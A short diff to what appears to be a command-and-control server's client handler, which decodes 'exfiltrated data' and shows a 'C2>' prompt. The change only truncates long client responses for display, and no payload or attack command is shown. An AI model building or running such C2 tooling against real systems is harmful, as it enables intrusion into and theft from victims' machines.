@@ -82,7 +82,14 @@ def handle_client(
                         f"\n{Colors.FAIL}[!] Error decoding exfiltrated data: {e}{Colors.ENDC}"
                     )
             else:
-                print(f"\n[ID {cid}] Response: \n{data}")
+                if len(data) > 2000:
+                    preview = data[:200]
+                    print(
+                        f"\n[ID {cid}] Response (TRUNCATED due to size): \n{preview}...\n[... {len(data)} bytes hidden ...]"
+                    )
+                else:
+                    print(f"\n[ID {cid}] Response: \n{data}")
+
                 print("C2>", end="", flush=True)
 
             print(f"\n[ID {cid}] Response: \n{data}")
